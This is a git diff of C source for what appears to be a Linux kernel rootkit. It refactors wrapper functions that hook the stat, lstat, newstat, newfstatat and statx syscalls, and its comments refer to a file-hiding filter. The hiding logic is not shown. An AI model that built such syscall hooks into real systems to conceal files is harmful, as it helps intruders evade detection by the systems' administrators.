@@ -3,12 +3,7 @@
     не скрывает по pid (это что?)
 */
 
-/*
-    Находятся в src/hide/filter_functions.c
-    
-    bool copy_filepath(char *filepath, char **kfilepath);
-    bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath);
-*/
+#include "files.h"
 
 bool copy_file_stat(struct stat *statbuf, struct stat **kstatbuf);
 bool copy_file_statx(struct statx *statxbuf, struct statx **kstatxbuf);
@@ -77,7 +72,7 @@ void free_bufs(void *first, void *second) {
         );
 
 */
-static asmlinkage long ex_sys_stat(struct pt_regs *regs)
+asmlinkage long ex_sys_stat(struct pt_regs *regs)
 {
     long ret = real_sys_stat(regs);
 
@@ -107,7 +102,7 @@ out:
         struct __old_kernel_stat __user *statbuf    - si
         );
 */
-static asmlinkage long ex_sys_lstat(struct pt_regs *regs)
+asmlinkage long ex_sys_lstat(struct pt_regs *regs)
 {
     long ret = real_sys_lstat(regs);
 
@@ -136,7 +131,7 @@ out:
         const char __user *filename,    - di
         struct stat __user *statbuf);   - si
 */
-static asmlinkage long ex_sys_newstat(struct pt_regs *regs)
+asmlinkage long ex_sys_newstat(struct pt_regs *regs)
 {
     long ret = real_sys_newstat(regs);
     
@@ -166,7 +161,7 @@ out:
         struct stat __user *statbuf     - si
         );
 */
-static asmlinkage long ex_sys_newlstat(struct pt_regs *regs)
+asmlinkage long ex_sys_newlstat(struct pt_regs *regs)
 {
     long ret = real_sys_newlstat(regs);
     
@@ -197,7 +192,7 @@ out:
 		struct stat __user *statbuf,    - dx
         int flag);                      - r10
 */
-static asmlinkage long ex_sys_newfstatat(struct pt_regs *regs)
+asmlinkage long ex_sys_newfstatat(struct pt_regs *regs)
 {
     long ret = real_sys_newfstatat(regs);
 
@@ -230,7 +225,7 @@ out:
         struct statx __user *buffer         - r8
         );
 */
-static asmlinkage long ex_sys_statx(struct pt_regs *regs)
+asmlinkage long ex_sys_statx(struct pt_regs *regs)
 {
     long ret = real_sys_statx(regs);
 
